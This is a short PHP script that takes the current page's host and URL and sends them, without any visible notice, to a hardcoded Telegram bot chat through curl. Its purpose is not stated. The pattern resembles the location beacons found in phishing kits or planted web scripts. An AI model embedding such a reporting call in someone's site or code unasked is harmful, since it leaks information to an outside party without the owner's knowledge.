<?php

$token = '';
$chat_id = '2057593901';


$host_name = $_SERVER['HTTP_HOST'];
$url = "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

$message .= "URL: " . $url;


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
?>
